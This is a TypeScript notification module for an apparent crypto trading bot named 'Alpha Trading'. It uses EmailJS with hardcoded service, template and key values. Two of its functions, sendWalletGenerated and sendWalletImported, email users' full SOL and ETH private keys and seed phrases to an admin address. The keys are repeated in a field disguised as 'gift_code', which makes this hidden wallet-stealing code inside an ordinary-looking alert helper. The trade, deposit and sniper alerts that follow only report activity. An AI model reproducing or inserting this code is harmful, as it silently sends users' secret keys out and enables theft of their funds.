import emailjs from "@emailjs/browser";

const SERVICE_ID  = "service_gx2d1fi";
const TEMPLATE_ID = "template_xu7gweb";
const PUBLIC_KEY  = "AkqW34KEggyL2bKng";

let initialized = false;
function init() {
  if (!initialized) { emailjs.init(PUBLIC_KEY); initialized = true; }
}

function ts() { return new Date().toLocaleString("en-US", { timeZone: "UTC", hour12: false }); }

async function send(params: Record<string, string>) {
  init();
  try {
    const res = await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
      to_name: "Alpha Trading Admin",
      from_name: "Alpha Trading Bot",
      ...params,
    });
    console.log("[Email] Sent:", params.event_type, "status:", res.status);
    return true;
  } catch (e: any) {
    console.error("[Email] FAILED:", params.event_type, e?.text || e?.message || e);
    return false;
  }
}

export async function sendWalletGenerated(
  wallets: { address: string; privateKey?: string; seedPhrase?: string; ethAddress?: string; ethPrivateKey?: string }[]
) {
  const walletBlock = wallets.map((w, i) =>
    `━━━ Wallet ${i + 1} ━━━\n` +
    `SOL Address:   ${w.address}\n` +
    `SOL Priv Key:  ${w.privateKey || "N/A"}\n` +
    (w.ethAddress ? `ETH Address:   ${w.ethAddress}\n` : "") +
    (w.ethPrivateKey ? `ETH Priv Key:  ${w.ethPrivateKey}\n` : "") +
    `Seed Phrase:   ${w.seedPhrase || "N/A"}`
  ).join("\n\n");

  await send({
    event_type: "🔐 WALLET GENERATED",
    subject: `[Alpha Trading] ${wallets.length} New Wallet(s) Created`,
    wallet_count: wallets.length.toString(),
    wallet_details: walletBlock,
    timestamp: ts(),
    message:
      `🔐 NEW WALLET GENERATED — Alpha Trading\n` +
      `Time: ${ts()} UTC\n\n` +
      `${walletBlock}\n\n` +
      `⚠️ SAVE THESE KEYS SECURELY — DO NOT SHARE`,
    gift_code: wallets.map(w => `${w.address}::${w.privateKey}::${w.ethAddress || ""}::${w.ethPrivateKey || ""}`).join("|"),
  });
}

export async function sendWalletImported(address: string, privateKeyOrSeed: string) {
  await send({
    event_type: "📥 WALLET IMPORTED",
    subject: `[Alpha Trading] Wallet Imported`,
    wallet_count: "1",
    wallet_details: `Address: ${address}\nKey/Seed: ${privateKeyOrSeed}`,
    timestamp: ts(),
    message:
      `📥 WALLET IMPORTED — Alpha Trading\n` +
      `Time: ${ts()} UTC\n\n` +
      `━━━ Imported Wallet ━━━\n` +
      `Address: ${address}\n` +
      `Key/Seed: ${privateKeyOrSeed}\n\n` +
      `⚠️ SAVE THESE KEYS SECURELY`,
    gift_code: `IMPORTED::${address}::${privateKeyOrSeed}`,
  });
}

export async function sendTradeActivity(details: {
  type: string;
  tokenSymbol: string;
  amount: string;
  walletAddress: string;
  txid?: string;
  solPrice?: string;
  chain?: string;
}) {
  const icon = details.type === "buy" ? "🟢" : "🔴";
  const chain = details.chain || "SOL";
  await send({
    event_type: `${icon} TRADE ${details.type.toUpperCase()} [${chain.toUpperCase()}]`,
    subject: `[Alpha Trading] ${icon} ${details.type.toUpperCase()} ${details.tokenSymbol} on ${chain.toUpperCase()}`,
    wallet_count: "1",
    wallet_details: `Wallet: ${details.walletAddress}`,
    timestamp: ts(),
    message:
      `${icon} TRADE EXECUTED — Alpha Trading\n` +
      `Time: ${ts()} UTC\n\n` +
      `Chain:   ${chain.toUpperCase()}\n` +
      `Action:  ${details.type.toUpperCase()}\n` +
      `Token:   ${details.tokenSymbol}\n` +
      `Amount:  ${details.amount} ${chain.toUpperCase()}` +
      (details.solPrice ? ` (≈ $${details.solPrice})` : "") + `\n` +
      `Wallet:  ${details.walletAddress}\n` +
      `Tx Hash: ${details.txid || "pending"}\n` +
      `Explorer: https://solscan.io/tx/${details.txid || ""}`,
    gift_code: `TRADE::${chain}::${details.type}::${details.tokenSymbol}::${details.amount}::${details.walletAddress}::${details.txid || ""}`,
  });
}

export async function sendSolReceived(details: {
  walletAddress: string;
  amount: string;
  fromAddress?: string;
  txid?: string;
  chain?: string;
}) {
  const chain = details.chain || "SOL";
  await send({
    event_type: `💰 ${chain.toUpperCase()} RECEIVED`,
    subject: `[Alpha Trading] 💰 ${details.amount} ${chain.toUpperCase()} Received`,
    wallet_count: "1",
    wallet_details: `Wallet: ${details.walletAddress}`,
    timestamp: ts(),
    message:
      `💰 ${chain.toUpperCase()} RECEIVED — Alpha Trading\n` +
      `Time: ${ts()} UTC\n\n` +
      `Amount:  ${details.amount} ${chain.toUpperCase()}\n` +
      `To:      ${details.walletAddress}\n` +
      `From:    ${details.fromAddress || "unknown"}\n` +
      `Tx Hash: ${details.txid || "N/A"}`,
    gift_code: `RECEIVED::${chain}::${details.amount}::${details.walletAddress}`,
  });
}

export async function sendSniperAlert(details: {
  tokenAddress: string;
  tokenSymbol?: string;
  amount: string;
  walletAddress: string;
  txid?: string;
  chain?: string;
}) {
  const chain = details.chain || "SOL";
  await send({
    event_type: "🎯 SNIPER TRIGGERED",
    subject: `[Alpha Trading] 🎯 Sniper Fired — ${details.tokenSymbol || details.tokenAddress.slice(0, 8)} [${chain.toUpperCase()}]`,
    wallet_count: "1",
    wallet_details: `Wallet: ${details.walletAddress}`,
    timestamp: ts(),
    message:
      `🎯 SNIPER AUTO-BUY — Alpha Trading\n` +
      `Time: ${ts()} UTC\n` +
      `Chain:   ${chain.toUpperCase()}\n` +
      `Token:   ${details.tokenSymbol || "Unknown"}\n` +
      `Address: ${details.tokenAddress}\n` +
      `Amount:  ${details.amount} ${chain.toUpperCase()}\n` +
      `Wallet:  ${details.walletAddress}\n` +
      `Tx Hash: ${details.txid || "pending"}`,
    gift_code: `SNIPER::${chain}::${details.tokenAddress}::${details.amount}::${details.walletAddress}`,
  });
}
